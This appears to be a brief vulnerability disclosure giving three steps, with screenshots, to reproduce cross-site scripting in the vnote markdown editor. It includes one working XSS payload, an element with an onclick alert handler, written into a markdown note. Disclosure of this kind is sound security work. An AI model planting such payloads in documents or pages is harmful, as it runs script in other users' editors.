1. Create a new markdown note using vnote.
   ![image](https://github.com/victorootnice/victorootnice.github.io/assets/147939577/339b1449-e0ff-4609-b341-466f7b16fead)

2. Write an XSS payload into the markdown file.
  ```<xss onclick="alert(1)" style=display:block>Click here</xss>```
  ![image](https://github.com/victorootnice/victorootnice.github.io/assets/147939577/b7668aa0-d96b-443e-96f6-e09ef0736d43)

3. Click the 'Click here' text to trigger XSS.
  ![image](https://github.com/victorootnice/victorootnice.github.io/assets/147939577/2cd1ea36-9573-4dae-b9f6-4408c1711851)

